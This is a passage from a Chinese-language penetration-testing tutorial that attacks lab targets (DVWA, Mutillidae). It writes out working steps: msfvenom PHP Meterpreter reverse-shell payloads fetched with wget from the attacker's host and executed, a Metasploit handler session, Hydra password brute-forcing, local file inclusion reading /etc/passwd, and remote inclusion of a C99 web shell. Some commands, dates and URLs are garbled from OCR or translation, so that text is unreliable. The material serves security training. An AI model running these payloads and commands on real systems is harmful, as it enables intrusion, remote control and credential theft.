
- 你可以使用 `autopwn` 模块的插入功能来操作 `java_signed_applet`。在 `LHOST` 中设置黑客电脑 IP 和任意端口，并决定 `payload` 类型为 `java/meterpreter/reverse_tcp`。`SRVHOST` 与我们相同，`SRPort` 为 `80`，`URI path` 为 `/`

![](img/91b4da451291288ee84ff207e23ccb97_99_2.png)

- 任何人浏览该链接都将向其/她发送 `java/meterpreter/reverse_tcp` payload。

- 当客户端访问留言板时，它将被重定向到黑客电脑并下载 `payload`。

## 理解命令执行漏洞

渗透测试员在 Web 渗透中遇到的最关键漏洞之一是找到一个允许其执行系统命令的应用程序。该漏洞的评级很高，因为它可以允许任何未经授权的恶意用户从 Web 应用程序向系统执行命令，从而收集大量信息或攻破目标主机。在本文中，我们将通过使用 `Damn Vulnerable Web Application (DVWA)` 来演示如何利用此漏洞。

![](img/91b4da451291288ee84ff207e23ccb97_101_0.png)

或使用 `ls` (`Unix`) 或 `dir` (`Windows`)

- 我们可以通过受感染的 `URL` 获取命令，`Unix` 和 `Windows` 中的某些命令除外。我们可以上传 `payload` 并通过该 `payload` 攻击服务器。

- 你可以浏览 `Web` 服务器。

- 你可以在 `Web` 服务器中上传 `payload`。我们将使用 `msfvenom`。`Msfvenom` 是 `msfpayload` 和 `msfencode` 的组合。

`msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.7 lport=5555 -f raw > /root/test.php`

```
root@:
root@ # msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.7 lport=5555 -f raw > /root/desktop/test.php
root@ # cd Desktop/
```

- 移除 `php` 文件中的哈希值。

- 我们必须将 `payload` 复制到 `Web` 服务器中，但它必须是文本文件。

`cp /root/test.txt /var/www/test.txt`

- 我们将在网站上应用命令，通过 `wget` 命令上传 `payload`

```
wget http://192.168.1.7/test.txt -O /tmp/test.php ; php -f /tmp/test.php
```

`wget http://192.168.52.137/test.txt -O /tmp/test.php ; php -f /tmp/test.php`

### 漏洞：命令执行

![](img/91b4da451291288ee84ff207e23ccb97_101_1.png)

- 准备多句处理器 (`multi handler`)。

```msf
### msfvenom
### use exploit/multi/handler
### set lhost (黑客 ip)
# set lport (我们为 payload 设置的端口)
### exploit
```

## 伦理黑客

```
meterpreter > exit
+] Shutting down Meterpreter...
[*] Meterpreter session 2 closed. Reason: Died
sf exploit(handler) >
sf exploit(handler) > exploit
[*] Started reverse handler on 192.168.1.7:55555
[*] Starting the payload ...
[*] Sending stage (38553 bytes) to 192.168.1.3
[*] Meterpreter session 3 opened (192.168.1.7:55555) -> 192.168.1.3:40582) at 201-08-05 22:17:28 -0000
meterpreter >
```

`SQL` 注入（盲注）`http://www.ss64.com/nt/`

- 确保在你想要攻击的 `Web` 服务器上安装了 `php`。

![](img/91b4da451291288ee84ff207e23ccb97_102_0.png)

## 暴力破解漏洞

在此类攻击中，攻击者试图在对安全机制了解极少的情况下绕过它们。使用一种或多种方法：字典攻击（带变体）、暴力破解攻击（带有给定的字符，例如：字母、数字、特殊字符），攻击者试图实现其目标。考虑到给定的方法和尝试次数，攻击者能够计算攻击将持续多久。另一方面，暴力破解攻击包含了所有字符类，主要用于猜测密码。然而，有很多工具使用这种技术来检查 `Web` 服务结构并通过 `GET/POST` 表单获取用户名和密码来访问网站。在 `GET` 和 `POST` 请求后，我们有很多工具可以进行暴力破解。

- 输入用户名和密码。

- 获取 `Header` 信息。

```http
GET http://192.168.1.2/vulnerabilities/brute/?username=user&password=user&Login=Login HTTP/1.1
Host: 192.168.1.2
User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:22.0) Gecko/201010 Firefox/22.0
Accept: text/html,application/xml,application/xml,*q=0.9,*q=0.8
Accept-Language: en-US,q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.1.2/vulnerabilities/brute/
Cookie: PHPSESSID=...security=high
Connection: keep-alive

HTTP/1.1 200 OK
Date: Wed, 14 Aug 2013 23:24:45 GMT
Server: Apache/2.2.14 (Windows) mod_ssl/2.2.14 OpenSSL/0.9.8 PHP/5.3.1
X-Powered-By: PHP/5.3.1
Expires: 23 Jun 2009 12:00:00
Cache-Control: no-cache, must-revalidate
```

- 在暴力破解中填写信息。

## Web 表单

![](img/91b4da451291288ee84ff207e23ccb97_104_0.png)

- 选择暴力破解。

![](img/91b4da451291288ee84ff207e23ccb97_104_1.png)

- 使用 `burp suite` 尝试 `mullitidae` 网站。将 `firefox` 中的代理设置为 `IP` 地址 `127.0.0.1` 和端口 `80`。这很难使用。

- 你可以使用 `hydra` 工具

## 暴力破解攻击

- 使用暴力破解工具

- 使用 `burpsuite` 工具

`hydra -l admin -P /root/Desktop/pass.txt 192.168.1.6 http-post-form /multillidae/index.php?page=login.php?username=USER&password=PASS&login-php-submit-button=Login Not Logged In`

- `username`

- 字典文件

- 目标主机，可以通过域名更改

- `http-post-form` -> 服务模块

- `/multillidae/index.php?page=login.php` -> 路径

- `username` -> 输入表单

- `password` -> 输入表单

- `login-php-submit-button` -> 提交按钮处的表单

- 应用程序登录失败（`Not Logged In`）时的错误消息

![](img/91b4da451291288ee84ff207e23ccb97_105_0.png)

```
root@bt:~# 
File Edit View Terminal Help
root@bt:~# hydra -l admin -P /root/Desktop/pass.txt 192.168.1.6 http-post-form /multillidae/index.php?page=login.php?username=USER&password=PASS&login-php-submit-button=Login:Not Logged In
Hydra v7.3 (c)2012) by van Hauser & David Maciejak - 仅用于法律目的
Hydra (http://www.thc.org/thc-hydra) starting at 2013-08-14 20:27:56
[DATA] 10 tasks, 1 server, 10 try per task
[DATA] attacking service http-post-form on 80
[STATUS] finished for 192.168.1.6 (waiting for children)
[80] host: 192.168.1.6 login: admin password: admin
of 1 target completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2013-08-14 20:28:10
root@bt:~#
```

### q) 本地文件包含 (LFI):

- 理解文件包含漏洞

- 本地文件包含 (`LFI`)

- 本地文件包含意味着在 `php` 页面上加载 `/etc/passwd`、`etc/host` 等本地文件。出现此漏洞有许多编程错误。当程序员在 `php` 页面上放置某些错误内容时，就会产生此漏洞

- 远程文件包含 (`RFI`)

- 远程文件包含 (`RFI`) 是一种常见于网站的漏洞。它允许攻击者通过 `Web` 服务器上的脚本包含远程文件。该漏洞由于对用户输入未进行适当验证。这会导致输出文件的内容。

- 在本地文件包含中，如果 `Web` 存在本地文件包含漏洞，可以通过该漏洞读取 `Web` 服务器内部的文件，如 `/etc/passwd`。

- 在 `DVWA` 中，进入文件包含。

```
192.168.1.2/vulnerabilities/lfi/?page=include.php
```

- 修改为你想要下载的文件 `/etc/passwd`

```
192.168.1.2/vulnerabilities/lfi/?page=/etc/passwd
```

- 我们可以下载的最重要文件

- 在 `Windows` 机器上使用其他命令

`Page=../../../boot.ini`

### r) 远程文件包含 (RFI):

- 当应用程序存在此漏洞时，我们可以在该网站内部放置另一个页面。这个网页被称为 `web shell`（`Web` 后门）。

- 理解 `web shell`

![](img/91b4da451291288ee84ff207e23ccb97_107_0.png)

- `shell` 可以用任何编程语言编写，大部分使用 `php`。通过远程包含，我们可以获得 `Web` 服务器的访问权限并在上面部署 `shell`。有些 `shell` 如 `C99.php`、`R57.php`、`C100.php`。

- `C99 shell`

![](img/91b4da451291288ee84ff207e23ccb97_107_1.png)

- `R57`

同时选择

查找文件

执行

在...中查找

查找

在文件 `C:\compile\shell\` 中

`C:\inet\home\`

仅限

`log.php`

`// eval script();`

`// ushell("shell.php");`

`// readfile("/etc/passwd");`

执行 `PHP` 代码

执行

在服务器上上传文件 ::

本地文件名

未选择文件。

上传

远程文件名

从服务器下载文件 ::

`C:\compile\shell\`

下载

身份验证

无需身份验证

`ftp`

`FTP`

从远程 `ftp` 服务器下载文件

`FTP` 服务器: `127.0.0.1:`

将文件发送到远程 `ftp` 服务器

用户名

`anonymous`

密码

`bob@microsoft.com`

服务器上的文件:

![](img/91b4da451291288ee84ff207e23ccb97_108_0.png)

结果位于：

- 将 `shell` 放入 `/var/www` 文件夹中。将 `shell` 作为文本文件存放在黑客电脑上。启动 `apache` 服务。

- 访问 `multilitidae` 网站。

![](img/91b4da451291288ee84ff207e23ccb97_108_1.png)

- 将 `home.php` 修改为黑客电脑的 `shell` 地址 `http://192.168.52.134/c99.txt`

## # c99Shell v.1.0 pre-release build #16!

```
Server Apache/2.4.41 (Ubuntu)
- Ubuntu Linux 5.4.0-42-generic #42-Ubuntu SMP (Jul 2 20:48:33 UTC 2020)
- PHP/7.4.3-fpm
- OpenSSL/1.1.1d-10 Mar 2020
10:13:10 UTC 2020
```

由黑客所有

- 在 `dvwa` 中尝试，然后我们放入 `shell` 地址

`http://192.168.52.134/dvwa/vulnerabilities/fi/?page=include.php`

`http://192.168.52.134/dvwa/multilithard/fi/?page=http://192.168.52.137/c99.php`

`http://192.168.52.134/multilithard/page=http://192.168.52.137/c99.php ?`

## # c99Shell v.1.0 pre-release build #16!

```
Server Apache/2.4.41 (Ubuntu)
- Ubuntu Linux 5.4.0-42-generic #42-Ubuntu SMP (Jul 2 20:48:33 UTC 2020)
- PHP/7.4.3-fpm
- OpenSSL/1.1.1d-10 Mar 2020
10:13:10 UTC 2020
```

由黑客所有

- 我们可以在 `Web` 服务器上创建 `payload` 并将其上传

![](img/91b4da451291288ee84ff207e23ccb97_109_0.png)

- 在黑客电脑上创建 `php/meterpreter/reverse_tcp` `payload`

```
root@bt:~ File Edit Help
root@bt:~ # msfpayload/meterpreter/reverse_tcp LHOST=192.168.1.6 LPORT=5555 -t shell.php
```

- 打开文件并删除 `php` 文件中的 `hash`

- 进入黑客电脑的 `/var/www` 并将其放置。启动 `apache` 服务。

- 在同一 `handler` 中开启 `handler`

```
msf > exploit/multi/handler
msf exploit(handler) > set PAYLOAD file:/root/shell.php
[-] The value specified for PAYLOAD is valid
msf exploit(handler) > set PAYLOAD php/meterpreter/reverse_tcp
PAYLOAD => php/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.6
LHOST => 192.168.1.6
msf exploit(handler) > set LPORT 5555
LPORT => 5555
msf exploit(handler) > exploit
```

![](img/91b4da451291288ee84ff207e23ccb97_110_0.png)

使用浏览器将 `payload` 上传到 `Web` 服务器。

![](img/91b4da451291288ee84ff207e23ccb97_110_1.png)

- 将打开 `meterpreter session`
